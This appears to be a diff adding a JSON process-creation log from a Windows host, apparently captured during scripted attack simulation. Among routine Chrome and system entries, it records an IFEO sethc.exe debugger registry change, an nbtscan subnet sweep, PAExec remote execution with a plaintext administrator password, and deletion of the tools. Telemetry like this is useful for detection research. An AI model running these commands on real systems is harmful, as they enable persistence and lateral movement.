+      "pid": "3332",
+      "parent_id": "3900",
+      "parent_key": "3900_194323.3531",
+      "image": "reg.exe",
+      "command_line": "\"C:\\Windows\\system32\\reg.exe\"  query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\"",
+      "msec": "194504.9759",
+      "repeat_count": 2
+    },
+    "836_194528.9658": {
+      "pid": "836",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"REG ADD \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\\" /v Debugger /t REG_SZ /d \\\"C:\\windows\\system32\\sethc.exe\\\" /f;REG query \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\\"\"",
+      "msec": "194528.9658",
+      "repeat_count": 1
+    },
+    "4608_194657.7493": {
+      "pid": "4608",
+      "parent_id": "836",
+      "parent_key": "836_194528.9658",
+      "image": "reg.exe",
+      "command_line": "\"C:\\Windows\\system32\\reg.exe\"  ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\sethc.exe /f",
+      "msec": "194657.7493",
+      "repeat_count": 1
+    },
+    "3228_319806.2991": {
+      "pid": "3228",
+      "parent_id": "6216",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=12 --launch-time-ticks=1218160564597 --mojo-platform-channel-handle=2284 --field-trial-handle=1204,i,15738228045186771879,839107963287655055,131072 /prefetch:1",
+      "msec": "319806.2991",
+      "repeat_count": 1
+    },
+    "3408_194686.4001": {
+      "pid": "3408",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"echo end:b7f92752-df34-4b08-9e98-45a3004b94ff\"",
+      "msec": "194686.4001",
+      "repeat_count": 1
+    },
+    "3464_204635.8139": {
+      "pid": "3464",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c echo start:e96998eb-ab9a-4a48-979c-fb68511a6a83",
+      "msec": "204635.8139",
+      "repeat_count": 1
+    },
+    "4772_204746.1102": {
+      "pid": "4772",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c nbtscan.exe 192.168.0.244/24",
+      "msec": "204746.1102",
+      "repeat_count": 1
+    },
+    "4976_204753.3457": {
+      "pid": "4976",
+      "parent_id": "4772",
+      "parent_key": "4772_204746.1102",
+      "image": "nbtscan.exe",
+      "command_line": "nbtscan.exe  192.168.0.244/24",
+      "msec": "204753.3457",
+      "repeat_count": 1
+    },
+    "4596_210755.0944": {
+      "pid": "4596",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c del /f /q nbtscan.exe",
+      "msec": "210755.0944",
+      "repeat_count": 1
+    },
+    "1860_210763.7369": {
+      "pid": "1860",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c echo end:e96998eb-ab9a-4a48-979c-fb68511a6a83",
+      "msec": "210763.7369",
+      "repeat_count": 1
+    },
+    "4196_214827.1579": {
+      "pid": "4196",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c echo start:e3c59524-1c33-40e6-99c4-a2d8329d047f",
+      "msec": "214827.1579",
+      "repeat_count": 1
+    },
+    "2284_215089.4934": {
+      "pid": "2284",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c PAExec.exe \\\\192.168.0.95 -u administrator -p Data123456! ipconfig",
+      "msec": "215089.4934",
+      "repeat_count": 1
+    },
+    "2196_215094.5106": {
+      "pid": "2196",
+      "parent_id": "2284",
+      "parent_key": "2284_215089.4934",
+      "image": "PAExec.exe",
+      "command_line": "PAExec.exe  \\\\192.168.0.95 -u administrator -p Data123456! ipconfig",
+      "msec": "215094.5106",
+      "repeat_count": 1
+    },
+    "2788_215136.3338": {
+      "pid": "2788",
+      "parent_id": "456",
+      "parent_key": null,
+      "image": "PAExec-2196-WIN2012-1.exe",
+      "command_line": "C:\\Windows\\PAExec-2196-WIN2012-1.exe -service",
+      "msec": "215136.3338",
+      "repeat_count": 1
+    },
+    "4680_215375.4705": {
+      "pid": "4680",
+      "parent_id": "2788",
+      "parent_key": "2788_215136.3338",
+      "image": "ipconfig.exe",
+      "command_line": "\"ipconfig\"",
+      "msec": "215375.4705",
+      "repeat_count": 1
+    },
+    "3720_223649.5898": {
+      "pid": "3720",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c del /f /q PAExec.exe",
+      "msec": "223649.5898",
+      "repeat_count": 2
+    },
+    "4604_223658.2723": {
+      "pid": "4604",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c echo end:e3c59524-1c33-40e6-99c4-a2d8329d047f",
+      "msec": "223658.2723",
+      "repeat_count": 1
+    },
+    "2952_225064.8150": {
+      "pid": "2952",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c echo start:60039041-7450-46ab-99f6-126b30b91407",
+      "msec": "225064.8150",
+      "repeat_count": 1
+    },
+    "3988_225379.0334": {
+      "pid": "3988",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c PAExec.exe \\\\192.168.0.244 -u administrator -p Data123456! ipconfig",
+      "msec": "225379.0334",
+      "repeat_count": 1
+    },
+    "4224_225385.5061": {
+      "pid": "4224",
+      "parent_id": "3988",
+      "parent_key": "3988_225379.0334",
+      "image": "PAExec.exe",
+      "command_line": "PAExec.exe  \\\\192.168.0.244 -u administrator -p Data123456! ipconfig",
+      "msec": "225385.5061",
+      "repeat_count": 1
+    },
+    "6504_531766.5843": {
+      "pid": "6504",
+      "parent_id": "6540",
+      "parent_key": "3148_27254.5916",
+      "image": "pgAdmin4.exe",
+      "command_line": "\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\\pgAdmin4.exe\" --type=crashpad-handler \"--user-data-dir=C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\" /prefetch:7 --monitor-self --monitor-self-argument=--type=crashpad-handler \"--monitor-self-argument=--user-data-dir=C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\" --monitor-self-argument=/prefetch:7 --monitor-self-annotation=ptype=crashpad-handler \"--database=C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\\Crashpad\" \"--metrics-dir=C:\\",
+      "msec": "531766.5843",
+      "repeat_count": 1
+    },
+    "5896_531772.7143": {
+      "pid": "5896",
+      "parent_id": "6504",
+      "parent_key": "6504_531766.5843",
+      "image": "pgAdmin4.exe",
+      "command_line": "\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\\pgAdmin4.exe\" --type=crashpad-handler \"--user-data-dir=C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\" /prefetch:7 --no-periodic-tasks --monitor-self-annotation=ptype=crashpad-handler \"--database=C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\\Crashpad\" --annotation=plat=Win64 --annotation=prod=pgadmin4 --annotation=ver= --initial-client-data=0x118,0x11c,0x120,0x9c,0x114,0x7ff71e3d80d0,0x7ff71e3d80e0,0x7ff71e3d80f0",
+      "msec": "531772.7143",
+      "repeat_count": 1
+    },
+    "4496_531803.7790": {
+      "pid": "4496",
+      "parent_id": "6540",
+      "parent_key": "3148_27254.5916",
+      "image": "pgAdmin4.exe",
+      "command_line": "\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\\pgAdmin4.exe\" --type=gpu-process --field-trial-handle=1240,1230285206016919585,15071984952487318545,131072 --no-sandbox --user-data-dir=\"C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\" --nwapp-path=\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\" --start-stack-profiler --gpu-preferences=UAAAAAAAAADgAAAQAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgAAAAAAAAAeAAAAAAAAAAoAAAABAAAACAAAAAAAAAAKAAAAAAAAAAwAAAAAAAAADgAAAAAAAAAEAAAAAAAAAA",
+      "msec": "531803.7790",
+      "repeat_count": 1
+    },
+    "4776_531914.1586": {
+      "pid": "4776",
+      "parent_id": "6540",
+      "parent_key": "3148_27254.5916",
+      "image": "pgAdmin4.exe",
+      "command_line": "\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\\pgAdmin4.exe\" --type=renderer --no-sandbox --file-url-path-alias=\"/gen=C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\\gen\" --no-zygote --field-trial-handle=1240,1230285206016919585,15071984952487318545,131072 --lang=zh-CN --user-data-dir=\"C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\" --nwapp-path=\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\" --nwjs --extension-process --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --mojo-platform",
+      "msec": "531914.1586",
+      "repeat_count": 1
+    },
+    "1760_233942.4639": {
+      "pid": "1760",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c echo end:60039041-7450-46ab-99f6-126b30b91407",
+      "msec": "233942.4639",
+      "repeat_count": 1
+    },
+    "4832_593744.7834": {
+      "pid": "4832",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "sc.exe",
+      "command_line": "C:\\Windows\\system32\\sc.exe start wuauserv",
+      "msec": "593744.7834",
+      "repeat_count": 4
+    },
+    "3204_732177.4654": {
+      "pid": "3204",
+      "parent_id": "200",
+      "parent_key": null,
+      "image": "smss.exe",
+      "command_line": "\\SystemRoot\\System32\\smss.exe 00000000 00000050 ",
+      "msec": "732177.4654",
+      "repeat_count": 4
+    },
+    "4400_732179.5964": {
+      "pid": "4400",
+      "parent_id": "3204",
+      "parent_key": "3204_732177.4654",
+      "image": "csrss.exe",
+      "command_line": "%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",
+      "msec": "732179.5964",
+      "repeat_count": 4
+    },
+    "3160_732185.4277": {
+      "pid": "3160",
+      "parent_id": "3204",
+      "parent_key": "3204_732177.4654",
+      "image": "winlogon.exe",
+      "command_line": "winlogon.exe",
+      "msec": "732185.4277",
+      "repeat_count": 4
+    },
+    "2916_732344.7379": {
+      "pid": "2916",
+      "parent_id": "3160",
+      "parent_key": "3160_732185.4277",
+      "image": "LogonUI.exe",
+      "command_line": "\"LogonUI.exe\" /flags:0x0",
+      "msec": "732344.7379",
+      "repeat_count": 4
+    },
+    "2572_732345.5629": {
+      "pid": "2572",
+      "parent_id": "3160",
+      "parent_key": "3160_732185.4277",
+      "image": "dwm.exe",
+      "command_line": "\"dwm.exe\"",
+      "msec": "732345.5629",
+      "repeat_count": 4
+    },
+    "3408_732402.5782": {
+      "pid": "3408",
+      "parent_id": "524",
+      "parent_key": null,
+      "image": "ChsIME.exe",
+      "command_line": "C:\\Windows\\System32\\InputMethod\\CHS\\ChsIME.exe -Embedding",
+      "msec": "732402.5782",
+      "repeat_count": 4
+    },
+    "672_732851.3400": {
+      "pid": "672",
+      "parent_id": "88",
+      "parent_key": null,
+      "image": "rdpclip.exe",
+      "command_line": "rdpclip",
+      "msec": "732851.3400",
+      "repeat_count": 4
+    },
+    "616_733211.1406": {
+      "pid": "616",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskhost.exe",
+      "command_line": "taskhost.exe ",
+      "msec": "733211.1406",
+      "repeat_count": 3
+    },
+    "4568_733346.8255": {
+      "pid": "4568",
+      "parent_id": "524",
+      "parent_key": null,
+      "image": "dllhost.exe",
+      "command_line": "C:\\Windows\\system32\\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}",
+      "msec": "733346.8255",
+      "repeat_count": 3
+    },
+    "1524_569095.6169": {
+      "pid": "1524",
+      "parent_id": "2428",
+      "parent_key": null,
+      "image": "Taskmgr.exe",
+      "command_line": "\"C:\\Windows\\system32\\taskmgr.exe\" /4",
+      "msec": "569095.6169",
+      "repeat_count": 1
+    },
+    "2300_818770.6517": {
+      "pid": "2300",
+      "parent_id": "2428",
+      "parent_key": null,
+      "image": "notepad.exe",
+      "command_line": "\"C:\\Windows\\system32\\NOTEPAD.EXE\" D:\\benign1.txt",
+      "msec": "818770.6517",
+      "repeat_count": 1
+    },
+    "5936_853323.5675": {
+      "pid": "5936",
+      "parent_id": "524",
+      "parent_key": null,
+      "image": "OpenWith.exe",
+      "command_line": "C:\\Windows\\system32\\OpenWith.exe -Embedding",
+      "msec": "853323.5675",
+      "repeat_count": 1
+    },
+    "6680_932394.2261": {
+      "pid": "6680",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-GB --service-sandbox-type=utility --mojo-platform-channel-handle=4480 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:8",
+      "msec": "932394.2261",
+      "repeat_count": 11
+    },
+    "6792_943476.7685": {
+      "pid": "6792",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=14 --launch-time-ticks=1218784235134 --mojo-platform-channel-handle=4720 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "943476.7685",
+      "repeat_count": 1
+    },
+    "6476_945400.6305": {
+      "pid": "6476",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=15 --launch-time-ticks=1218786125116 --mojo-platform-channel-handle=4504 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "945400.6305",
+      "repeat_count": 1
+    },
+    "6000_953509.3283": {
+      "pid": "6000",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "software_reporter_tool.exe",
+      "command_line": "\"C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\99.279.200\\software_reporter_tool.exe\" --engine=2 --scan-locations=1,2,3,4,5,6,7,8,10 --disabled-locations=9,11 --session-id=YzNf24YYZfuvRHVbjuMFf3GpplnJ+CDak8V6SAZz --registry-suffix=ESET --enable-crash-reporting --srt-field-trial-group-name=NewCleanerUIExperiment",
+      "msec": "953509.3283",
+      "repeat_count": 1
+    },
+    "3344_953558.5727": {
+      "pid": "3344",
+      "parent_id": "6000",
+      "parent_key": "6000_953509.3283",
+      "image": "software_reporter_tool.exe",
+      "command_line": "\"c:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\software_reporter_tool.exe\" --crash-handler \"--database=c:\\users\\administrator\\appdata\\local\\Google\\Software Reporter Tool\" --url=https://clients2.google.com/cr/report --annotation=plat=Win32 --annotation=prod=ChromeFoil --annotation=ver=99.279.200 --initial-client-data=0x1c0,0x1c4,0x1c8,0x19c,0x1cc,0x7ff763b525a0,0x7ff763b525b0,0x7ff763b525c0",
+      "msec": "953558.5727",
+      "repeat_count": 1
+    },
+    "5176_953609.1040": {
+      "pid": "5176",
+      "parent_id": "6000",
+      "parent_key": "6000_953509.3283",
+      "image": "software_reporter_tool.exe",
+      "command_line": "\"c:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\software_reporter_tool.exe\" --enable-crash-reporting --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_6000_XJTPKPDSUGJHATOO\" --sandboxed-process-id=2 --init-done-notifier=600 --sandbox-mojo-pipe-token=10875049845061253074 --mojo-platform-channel-handle=568 --engine=2",
+      "msec": "953609.1040",
+      "repeat_count": 1
+    },
+    "2904_953750.9236": {
+      "pid": "2904",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=17 --launch-time-ticks=1218794509389 --mojo-platform-channel-handle=1892 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "953750.9236",
+      "repeat_count": 1
+    },
+    "3760_953956.4087": {
+      "pid": "3760",
+      "parent_id": "6000",
+      "parent_key": "6000_953509.3283",
+      "image": "software_reporter_tool.exe",
+      "command_line": "\"c:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\software_reporter_tool.exe\" --enable-crash-reporting --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_6000_XJTPKPDSUGJHATOO\" --sandboxed-process-id=3 --init-done-notifier=812 --sandbox-mojo-pipe-token=2896627467350078373 --mojo-platform-channel-handle=804",
+      "msec": "953956.4087",
+      "repeat_count": 1
+    },
+    "5100_954479.7921": {
+      "pid": "5100",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=18 --launch-time-ticks=1218795238140 --mojo-platform-channel-handle=4628 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "954479.7921",
+      "repeat_count": 1
+    },
+    "6628_966953.4176": {
+      "pid": "6628",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=19 --launch-time-ticks=1218807711669 --mojo-platform-channel-handle=792 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "966953.4176",
+      "repeat_count": 1
+    },
+    "7156_973223.5286": {
+      "pid": "7156",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=21 --launch-time-ticks=1218813981963 --mojo-platform-channel-handle=4732 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "973223.5286",
+      "repeat_count": 1
+    },
+    "2424_975050.1421": {
+      "pid": "2424",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=22 --launch-time-ticks=1218815808485 --mojo-platform-channel-handle=1120 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "975050.1421",
+      "repeat_count": 1
+    },
+    "6436_976129.2556": {
+      "pid": "6436",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=23 --launch-time-ticks=1218816887595 --mojo-platform-channel-handle=4424 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "976129.2556",
+      "repeat_count": 1
+    },
+    "6052_976708.4519": {
+      "pid": "6052",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-GB --service-sandbox-type=none --mojo-platform-channel-handle=3756 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:8",
+      "msec": "976708.4519",
+      "repeat_count": 1
+    },
+    "2472_982446.0397": {
+      "pid": "2472",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=25 --launch-time-ticks=1218823204404 --mojo-platform-channel-handle=3660 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "982446.0397",
+      "repeat_count": 1
+    },
+    "3148_986529.2573": {
+      "pid": "3148",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=26 --launch-time-ticks=1218827287607 --mojo-platform-channel-handle=4656 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "986529.2573",
+      "repeat_count": 1
+    },
+    "6344_987788.8857": {
+      "pid": "6344",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=gpu-process --disable-gpu-sandbox --use-gl=disabled --gpu-vendor-id=5140 --gpu-device-id=140 --gpu-sub-system-id=0 --gpu-revision=0 --gpu-driver-version=6.3.9600.19176 --gpu-preferences=UAAAAAAAAADoAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAgAgAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=5220 --field-trial-handle=1",
+      "msec": "987788.8857",
+      "repeat_count": 1
+    },
+    "6712_1046306.9603": {
+      "pid": "6712",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --utility-sub-type=chrome.mojom.FileUtilService --lang=en-GB --service-sandbox-type=utility --mojo-platform-channel-handle=1192 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:8",
+      "msec": "1046306.9603",
+      "repeat_count": 2
+    },
+    "2568_1053406.1014": {
+      "pid": "2568",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --utility-sub-type=quarantine.mojom.Quarantine --lang=en-GB --service-sandbox-type=none --mojo-platform-channel-handle=5356 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:8",
+      "msec": "1053406.1014",
+      "repeat_count": 2
+    },
+    "3496_1107018.8010": {
+      "pid": "3496",
+      "parent_id": "2428",
+      "parent_key": null,
+      "image": "notepad.exe",
+      "command_line": "\"C:\\Windows\\system32\\NOTEPAD.EXE\" D:\\phpStudy\\Apache\\conf\\vhosts.conf",
+      "msec": "1107018.8010",
+      "repeat_count": 2
+    },
+    "2824_1142535.0754": {
+      "pid": "2824",
+      "parent_id": "2428",
+      "parent_key": null,
+      "image": "notepad.exe",
+      "command_line": "\"C:\\Windows\\system32\\NOTEPAD.EXE\" D:\\phpStudy\\Apache\\conf\\extra\\httpd-php.conf",
+      "msec": "1142535.0754",
+      "repeat_count": 1
+    },
+    "5488_1172728.4783": {
+      "pid": "5488",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=38 --launch-time-ticks=1219013486760 --mojo-platform-channel-handle=4276 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "1172728.4783",
+      "repeat_count": 1
+    },
+    "1872_1172875.7866": {
+      "pid": "1872",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=39 --launch-time-ticks=1219013634048 --mojo-platform-channel-handle=2120 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "1172875.7866",
+      "repeat_count": 1
+    },
+    "5176_1175403.9036": {
+      "pid": "5176",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=40 --launch-time-ticks=1219016162076 --mojo-platform-channel-handle=5188 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "1175403.9036",
+      "repeat_count": 1
+    },
+    "6964_1178566.9360": {
+      "pid": "6964",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=41 --launch-time-ticks=1219019325038 --mojo-platform-channel-handle=4700 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "1178566.9360",
+      "repeat_count": 1
+    },
+    "3532_1228330.8365": {
+      "pid": "3532",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=43 --launch-time-ticks=1219069089268 --mojo-platform-channel-handle=5576 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "1228330.8365",
+      "repeat_count": 1
+    },
+    "1244_1231457.8259": {
+      "pid": "1244",
+      "parent_id": "5376",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=44 --launch-time-ticks=1219072214486 --mojo-platform-channel-handle=4896 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+      "msec": "1231457.8259",
+      "repeat_count": 1
+    },
+    "5896_3492657.6162": {
+      "pid": "5896",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {949666CC-3484-4C39-9B3D-75B487117FA1} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "3492657.6162",
+      "repeat_count": 1
+    },
+    "5032_3492665.5761": {
+      "pid": "5032",
+      "parent_id": "5896",
+      "parent_key": "5896_3492657.6162",
+      "image": "GoogleUpdate.exe",
+      "command_line": "\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /ua /installsource scheduler",
+      "msec": "3492665.5761",
